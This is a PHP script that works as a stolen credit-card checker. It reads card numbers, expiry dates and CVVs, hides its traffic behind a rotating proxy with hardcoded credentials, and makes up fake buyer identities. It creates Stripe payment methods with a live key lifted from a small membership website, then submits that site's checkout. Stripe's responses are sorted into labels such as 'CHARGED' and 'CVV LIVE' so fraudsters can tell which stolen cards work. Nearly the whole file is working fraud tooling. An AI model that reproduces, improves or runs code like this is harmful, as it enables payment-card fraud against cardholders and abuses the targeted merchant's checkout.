<?php 



error_reporting(0);

//---------------------------------------//
$amt = "5$ " ;
$gate = "Stripe";
$live = "✅️";
$die = "❌";
$vbv = "⚠️";

//---------------------------------------//

$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

#------[Email Generator]------#

function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@gmail.com';
}
$email = emailGenerate();
#------[Username Generator]------#
function usernameGen($length = 13)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$un = usernameGen();
#------[Password Generator]------#
function passwordGen($length = 15)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$pass = passwordGen();  
  

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

$last4 = substr($cc, -4);
#------[CC Type Randomizer]------#

$cardNames = array(
   "3" => "American Express",
   "4" => "Visa",
   "5" => "MasterCard",
   "6" => "Discover"
);
$card_type = $cardNames[substr($cc, 0, 1)];


function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

#--------------------[Proxy Section]---------------#
$ip = [
    'http://rp.proxyscrape.com:6060',
    
    ];

$yato = [ 
    '10h5w90p3gazpox:097uyq2vm9xlhm1', 
    '10h5w90p3gazpox:097uyq2vm9xlhm1', 
    '10h5w90p3gazpox:097uyq2vm9xlhm1', 
    '10h5w90p3gazpox:097uyq2vm9xlhm1', 
    '10h5w90p3gazpox:097uyq2vm9xlhm1', 
    '10h5w90p3gazpox:097uyq2vm9xlhm1', 
     
    ];

$proxy = $ip[array_rand($ip)];
$proxyauth = $yato[array_rand($yato)];

function RandomStrings($length = 16){
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}   

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://ip-api.com/json');
curl_setopt($ch, CURLOPT_PROXY, "http://rp.proxyscrape.com:6060");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "10h5w90p3gazpox:097uyq2vm9xlhm1");
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$ip_response = curl_exec($ch);
curl_close($ch);

$ip_data = json_decode($ip_response, true);
$ips = $ip_data['query'];
$ip_countryflag = $ip_data['countryCode'];
$ip_countryname = $ip_data['country'];
$ip_isp = $ip_data['isp'];

if (isset($ips)){
$ipchk = "Live ✅";
}
if (empty($ips)){
$ipchk = "Dead ❌";
}
 
#--------------------[Proxy Section]END ---------------#

  //==================[Randomizing Details]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$postcode = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$num = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

//==============[Randomizing Details-END]======================//

//-------------------Req 2--------------//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://rp.proxyscrape.com:6060");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "10h5w90p3gazpox:097uyq2vm9xlhm1");
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: api.stripe.com';
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Path: /v1/payment_methods';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'Referer: https://js.stripe.com/';
$headers[] = 'sec-ch-ua: "Not/A)Brand";v="99", "Microsoft Edge";v="115", "Chromium";v="115"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][line1]=5th+Ave&billing_details[address][line2]=&billing_details[address][city]=New+York&billing_details[address][state]=NY&billing_details[address][postal_code]=10080&billing_details[address][country]=US&billing_details[name]=emma+stone&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=8b2b2d03-77c7-4159-88c0-7a6b1dd93c5d6c8b22&muid=e305b910-36e4-4917-8c97-46e68c687c54fe7826&sid=51696e98-c001-4642-abda-f53e8faddcad7e602e&pasted_fields=number&payment_user_agent=stripe.js%2Fc973c0a0ca%3B+stripe-js-v3%2Fc973c0a0ca%3B+split-card-element&time_on_page=67540&key=pk_live_51Mc7mOSBGrmFfn5ici1GhP0uMzKwaXxinDCFI2x2sjbOdRnH5umKSm2xMSx0MyuaHERs5MsG1eSPVxpndGO5BMrS00VtL4sRud&_stripe_account=acct_1Mc7mOSBGrmFfn5i');

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

$pi = Getstr($result1,'client_secret":"','_secret');

$src = Getstr($result1,'client_secret":"','"');
//==================req 1 end===============//

//==================req 2===============//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://rp.proxyscrape.com:6060");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "10h5w90p3gazpox:097uyq2vm9xlhm1");
curl_setopt($ch, CURLOPT_URL, 'https://vaithikasri.com/membership-account/membership-checkout/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'host: vaithikasri.com';
$headers[] = 'path: /membership-account/membership-checkout/';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'Cookie: woosw_key_ori=G80LU6';
$headers[] = 'Cookie: __stripe_mid=e305b910-36e4-4917-8c97-46e68c687c54fe7826';
$headers[] = 'Cookie: wordpress_test_cookie=WP%20Cookie%20check';
$headers[] = 'Cookie: woosw_key=G80LU6';
$headers[] = 'Cookie: PHPSESSID=6f755afd5b03306e16b2e4e9d63dc386';
$headers[] = 'Cookie: pmpro_visit=1';
$headers[] = 'Cookie: __stripe_sid=51696e98-c001-4642-abda-f53e8faddcad7e602e';
$headers[] = 'origin: https://vaithikasri.com';
$headers[] = 'referer: https://vaithikasri.com/membership-account/membership-checkout/';
$headers[] = 'sec-ch-ua: "Not/A)Brand";v="99", "Microsoft Edge";v="115", "Chromium";v="115"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188'; 

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'level=1&checkjavascript=1&price=1&other_discount_code=&username='.$un.'&password='.$pass.'&password2='.$pass.'&bemail='.$email.'&bconfirmemail='.$email.'&fullname=&bcountry=US&bfirstname='.$firstname.'&blastname='.$lastname.'&baddress1=5th+Ave&baddress2=&bcity=New+York&bstate=NY&bzipcode=10080&bphone=1+%28925%29+435-2446&CardType='.$card_type.'&discount_code=&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX'.$last4.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'
');


curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result2 = curl_exec($ch);
$msg = trim(strip_tags(getStr($result2,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));


//==================req 2 end===============//

# ---------------- [Responses] ----------------- #

if(strpos($result2, "payment_intent_unexpected_state")) {



    echo '➣  #DIE CC:  '.$lista.'</span><br>  ➣ Result: PAYMENT INTENT CONFIRMED '.$vbv.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';

}

elseif(strpos($result2, "Your card has insufficient funds.")) {

  echo '➣  #CVV CC:  '.$lista.'</span><br>  ➣ Result: INSUFFICIENT FUNDS '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';

}


elseif(strpos($result2, "incorrect_zip")) {

echo '➣  #CVV CC:  '.$lista.'</span><br>  ➣ Result: CVV LIVE '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';

}
    
    elseif(strpos($result2, "Your card has insufficient funds.")) {

echo '➣  #CVV CC:  '.$lista.'</span><br>  ➣ Result: INSUFFICIENT FUNDS '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';

} 

elseif(strpos($result2, 'security code is incorrect.')) {

echo '➣  #CHARGED CC:  '.$lista.'</span><br>  ➣ Result: CCN CHARGED '.$amt.' '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';

}


    elseif(strpos($result2, 'security code is invalid.')) {

echo '➣  #CHARGED CC:  '.$lista.'</span><br>  ➣ Result: CCN CHARGED '.$amt.' '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';

}
    elseif(strpos($result2, "Security code is incorrect")) {

echo '➣  #CHARGED CC:  '.$lista.'</span><br>  ➣ Result: CCN CHARGED '.$amt.''.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';

}
    
elseif(strpos($result2, "transaction_not_allowed")) {

echo '➣  #CVV CC:  '.$lista.'</span><br>  ➣ Result: TRANSACTION NOT ALLOWED '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';

}
    

elseif(strpos($result2, "stripe_3ds2_fingerprint")) {


echo '➣  #CVV CC:  '.$lista.'</span><br>  ➣ Result: 3D '.$vbv.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';

}


elseif(strpos($result2, "Suspicious activity detected. Try again in a few minutes.")) {



 echo '➣  #DIE CC:  '.$lista.'</span><br>  ➣ Result: Proxy Dead '.$die.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';



} 
elseif(strpos($result2, "generic_decline")) {
 echo '➣  #DIE CC:  '.$lista.'</span><br>  ➣ Result: GENERIC DECLINE '.$die.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';



} 

elseif(strpos($result2, "do_not_honor")) {

echo '➣  #DIE CC:  '.$lista.'</span><br>  ➣ Result: DO NOT HONOR '.$die.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';



} 


elseif(strpos($result2, "fraudulent")) {
echo '➣  #DIE CC:  '.$lista.'</span><br>  ➣ Result: FRAUDLENT '.$die.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';



} 
elseif(strpos($result2, "intent_confirmation_challenge")) {

echo '➣  #DIE CC:  '.$lista.'</span><br>  ➣ Result: CAPTCHA '.$vbv.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';



} 


elseif(strpos($result2, 'Your card was declined.')) {

echo '➣  #DIE CC:  '.$lista.'</span><br>  ➣ Result: CARD DECLINED ❌ <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';

}

elseif(strpos($result2, 'Error updating default payment method. Your card was declined.')) {

echo '➣  #DIE CC:  '.$lista.'</span><br>  ➣ Result: CARD DECLINED '.$die.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';

}

elseif(strpos($result2, '"cvc_check": "pass"')) {

echo '➣  #CVV CC:  '.$lista.'</span><br>  ➣ Result: CVV LIVE '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';

}

elseif(strpos($result2, "three_d_secure_redirect")) {

 echo '➣  #CVV CC:  '.$lista.'</span><br>  ➣ Result: 3D '.$vbv.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';



} 

elseif(strpos($result2, "missing_payment_information")) {

echo '➣  #DIE CC:  '.$lista.'</span><br>  ➣ Result: MISSING PAYMENT INFORMATION '.$die.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';



} 


elseif(strpos($result2, '"cvc_check": "fail"')) {

echo '➣  #CHARGED CC:  '.$lista.'</span><br>  ➣ Result: CCN LIVE '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';



} 

elseif(strpos($result2, "Membership Confirmation")) {

echo '➣  #CHARGED CC:  '.$lista.'</span><br>  ➣ Result: CHARGED '.$amt.' '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';

} 

elseif(strpos($result2, "Thank you for your support!")) {

    echo '➣  #CHARGED CC:  '.$lista.'</span><br>  ➣ Result: CHARGED '.$amt.' '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';

} 

elseif(strpos($result2, "Thank you for your donation")) {

    echo '➣  #CHARGED CC:  '.$lista.'</span><br>  ➣ Result: CHARGED '.$amt.' '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';

} 

elseif(strpos($result2, "/wishlist-member/?reg=")) {

   echo '➣  #CHARGED CC:  '.$lista.'</span><br>  ➣ Result: CHARGED '.$amt.' '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';

} 

elseif(strpos($result2, "Thank You For Donation.")) {

    echo '➣  #CHARGED CC:  '.$lista.'</span><br>  ➣ Result: CHARGED '.$amt.' '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';

} 

elseif(strpos($result2, "checkout completed")) {

    echo '➣  #CHARGED CC:  '.$lista.'</span><br>  ➣ Result: CHARGED '.$amt.' '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';

} 

elseif(strpos($result2, "Successful")) {

    echo '➣  #CHARGED CC:  '.$lista.'</span><br>  ➣ Result: CHARGED '.$amt.' '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';

} 

elseif(strpos($result2, "Thank You")) {

    echo '➣  #CHARGED CC:  '.$lista.'</span><br>  ➣ Result: CHARGED '.$amt.' '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';

} 

elseif(strpos($result2, "/donations/thank_you?donation_number=")) {

    echo '➣  #CHARGED CC:  '.$lista.'</span><br>  ➣ Result: CHARGED '.$amt.' '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';

} 


elseif(strpos($result2, "parameter_invalid_empty")) {

    echo '#DIE</span>  </span> ➣  CC:  '.$lista.'</span><br>  ➣ Result: '.$msg.'<br> ➣ Gate: Stripe '.$amt.' </span><br>'; 
exit;
}



elseif(strpos($result2, "Your card zip code is incorrect.")) {

echo '➣  #CVV CC:  '.$lista.'</span><br>  ➣ Result: CVV LIVE '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';



} 

elseif(strpos($result2, "Your card does not support this type of purchase.")) {

echo '➣  #CVV CC:  '.$lista.'</span><br>  ➣ Result: CARD DOESNT SUPPORT THIS TYPE OF PURCHASE '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';



} 


elseif(strpos($result2, "Your card is not supported.")) {

echo '➣  #CVV CC:  '.$lista.'</span><br>  ➣ Result: CARD DOESNT SUPPORT THIS TYPE OF PURCHASE '.$live.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';


} 


else {

echo '➣  #DIE CC:  '.$lista.'</span><br>  ➣ Result: '.$msg.' '.$die.' <br> ➣ Gate: '.$gate.' '.$amt.'  </span><br>';

} 


curl_close($ch);
ob_flush();

#echo $result1;
#echo $result2;
?>